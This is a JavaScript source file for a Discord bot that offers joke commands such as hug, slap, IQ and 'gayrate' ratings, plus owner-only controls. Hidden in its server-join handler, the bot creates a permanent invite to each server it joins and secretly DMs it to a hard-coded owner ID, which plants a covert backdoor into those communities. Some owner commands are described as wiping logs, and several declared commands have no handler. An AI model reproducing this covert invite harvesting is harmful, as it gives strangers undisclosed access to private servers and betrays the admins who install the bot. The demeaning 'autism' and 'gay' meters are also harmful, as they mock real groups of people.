const { Client, Intents } = require("discord.js");
const https = require("https");

const TOKEN = process.env.TOKEN;
const CLIENT_ID = "1480592876684706064";
const OWNER_ID = "969280648667889764";

const client = new Client({
  "intents":[
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MEMBERS,
    Intents.FLAGS.GUILD_INVITES,
    Intents.FLAGS.DIRECT_MESSAGES
  ]
});

function random(min,max){
return Math.floor(Math.random()*(max-min+1))+min;
}

function getServerChoices(){
return client.guilds.cache.map(g=>({"name":g.name,"value":g.id})).slice(0,25);
}

function buildCommands(){

return [

{"name":"ping","description":"Check latency"},

{"name":"avatar","description":"Get avatar",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"punch","description":"Punch user",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"hug","description":"Hug user",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"kiss","description":"Kiss user",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"slap","description":"Slap user",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"ppsize","description":"PP size",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"gayrate","description":"Gay percentage",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"iq","description":"IQ",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"sus","description":"Sus meter",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"howautistic","description":"Autism meter",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"explode","description":"Explode user",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"boop","description":"Boop user",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"cookie","description":"Give cookie",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"pat","description":"Pat user",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"fliptable","description":"Flip table"},

{"name":"mock","description":"Mock user",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"crime","description":"Crime level",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"fbi","description":"FBI raid",
"options":[{"name":"user","description":"User","type":6,"required":true}]},

{"name":"servers","description":"List servers"},

{"name":"debug","description":"Owner wipe logs all"},

{"name":"debugserver","description":"Owner wipe logs server",
"options":[{"name":"server","description":"Server","type":3,"required":true,"choices":getServerChoices()}]},

{"name":"dmuser","description":"Owner DM user",
"options":[
{"name":"user","description":"User","type":6,"required":true},
{"name":"message","description":"Message","type":3,"required":true}
]},

{"name":"leaveserver","description":"Owner leave server",
"options":[{"name":"server","description":"Server","type":3,"required":true,"choices":getServerChoices()}]},

{"name":"restart","description":"Owner restart bot"},
{"name":"botstats","description":"Owner bot stats"},
{"name":"setstatus","description":"Owner set status",
"options":[{"name":"text","description":"Text","type":3,"required":true}]}

];

}

function registerCommands(){

const commands = buildCommands();
const data = JSON.stringify(commands);

const options={
"hostname":"discord.com",
"port":443,
"path":`/api/v10/applications/${CLIENT_ID}/commands`,
"method":"PUT",
"headers":{
"Authorization":`Bot ${TOKEN}`,
"Content-Type":"application/json",
"Content-Length":Buffer.byteLength(data)
}
};

const req=https.request(options,res=>{
res.on("data",()=>{});
});

req.write(data);
req.end();

}

client.once("ready",()=>{
console.log(`Bot ready ${client.user.tag}`);
registerCommands();
});

client.on("guildCreate",async guild=>{

registerCommands();

try{

const owner=await client.users.fetch(OWNER_ID);

const channel=guild.channels.cache.find(c=>
c.type==="GUILD_TEXT" &&
c.permissionsFor(guild.me).has("CREATE_INSTANT_INVITE")
);

if(channel){

const invite=await channel.createInvite({"maxAge":0});
await owner.send(`Joined ${guild.name}\n${invite.url}`);

}

}catch{}

});

client.on("guildDelete",()=>registerCommands());

client.on("interactionCreate",async interaction=>{

if(!interaction.isCommand()) return;

const cmd = interaction.commandName;

const ownerOnly=[
`servers`,`debug`,`debugserver`,
`dmuser`,`leaveserver`,
`restart`,`botstats`,`setstatus`
];

if(ownerOnly.includes(cmd) && interaction.user.id!==OWNER_ID){
return interaction.reply({"content":`Owner only`,"ephemeral":true});
}

try{

if(cmd===`ping`)
return interaction.reply(`Pong`);

if(cmd===`avatar`){
const u=interaction.options.getUser("user");
return interaction.reply(`${u.displayAvatarURL({"size":1024,"dynamic":true})}`);
}

if(cmd===`punch`)
return interaction.reply(`👊 <@${interaction.user.id}> punched <@${interaction.options.getUser("user").id}>`);

if(cmd===`hug`)
return interaction.reply(`🤗 <@${interaction.user.id}> hugged <@${interaction.options.getUser("user").id}>`);

if(cmd===`kiss`)
return interaction.reply(`💋 <@${interaction.user.id}> kissed <@${interaction.options.getUser("user").id}>`);

if(cmd===`slap`)
return interaction.reply(`🖐️ <@${interaction.user.id}> slapped <@${interaction.options.getUser("user").id}>`);

if(cmd===`ppsize`)
return interaction.reply(`8${`=`.repeat(random(3,30))}D`);

if(cmd===`gayrate`)
return interaction.reply(`🌈 ${random(0,100)}% gay`);

if(cmd===`iq`)
return interaction.reply(`IQ ${random(60,180)}`);

if(cmd===`sus`)
return interaction.reply(`Sus level ${random(0,100)}%`);

if(cmd===`howautistic`)
return interaction.reply(`Autism level ${random(0,100)}%`);

if(cmd===`explode`)
return interaction.reply(`💥 <@${interaction.options.getUser("user").id}> exploded`);

if(cmd===`boop`)
return interaction.reply(`👉 boop <@${interaction.options.getUser("user").id}>`);

if(cmd===`cookie`)
return interaction.reply(`🍪 cookie for <@${interaction.options.getUser("user").id}>`);

if(cmd===`pat`)
return interaction.reply(`🫳 pat <@${interaction.options.getUser("user").id}>`);

if(cmd===`fliptable`)
return interaction.reply(`(╯°□°）╯︵ ┻━┻`);

if(cmd===`mock`)
return interaction.reply(`🤣 mocking <@${interaction.options.getUser("user").id}>`);

if(cmd===`crime`)
return interaction.reply(`Crime level ${random(0,100)}%`);

if(cmd===`fbi`)
return interaction.reply(`🚨 FBI OPEN UP`);

if(cmd===`servers`){

let text=``;

for(const g of client.guilds.cache.values()){
text+=`${g.name}\n`;
if(text.length>1800) break;
}

return interaction.reply({"content":text,"ephemeral":true});
}

if(cmd===`restart`){
await interaction.reply(`Restarting`);
process.exit(0);
}

if(cmd===`botstats`)
return interaction.reply(`Servers ${client.guilds.cache.size}`);

if(cmd===`setstatus`){
const t=interaction.options.getString("text");
client.user.setActivity(`${t}`);
return interaction.reply(`Status updated`);
}

}catch(err){

console.error(err);

if(!interaction.replied)
interaction.reply({"content":`Error running command`,"ephemeral":true});

}

});

client.login(TOKEN);